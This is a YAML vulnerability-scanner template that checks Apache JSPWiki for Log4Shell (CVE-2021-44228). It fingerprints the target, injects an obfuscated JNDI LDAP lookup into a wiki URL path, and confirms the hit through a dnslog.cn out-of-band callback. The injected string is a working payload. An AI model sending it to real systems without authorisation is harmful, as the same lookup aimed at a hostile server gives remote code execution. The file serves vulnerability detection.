name: Apache JSPWiki Log4shell CVE-2021-44228 (2)
manual: true
query: body="<div>JSPWiki" || title="JSPWiki"
transport: http
rules:
  r0:
    request:
      method: GET
      path: http://www.dnslog.cn/getdomain.php
    expression: response.status == 200
    output:
      dnstest: response.body
  r1:
    request:
      method: POST
      path: /wiki/$%7Bjndi:ldap:$%7B::-/%7D/{{dnstest}}/tea%7D
    expression: response.status == 200
  r2:
    request:
      method: GET
      path: http://www.dnslog.cn/getrecords.php
    expression: response.status == 200 && response.body.bcontains(b"{{dnstest}}")
expression: r0() && r1() && r2()
detail:
  links:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://mp.weixin.qq.com/s?__biz=MzA5OTA0MTU4Mg==&mid=2247485581&idx=1&sn=033cafb1442d44e6cfc85796e42f206d
  description: Apache JSPWiki is a leading open source WikiWiki engine, feature-rich
    and built around standard JEE components (Java, servlets, JSP).
  tags: rce
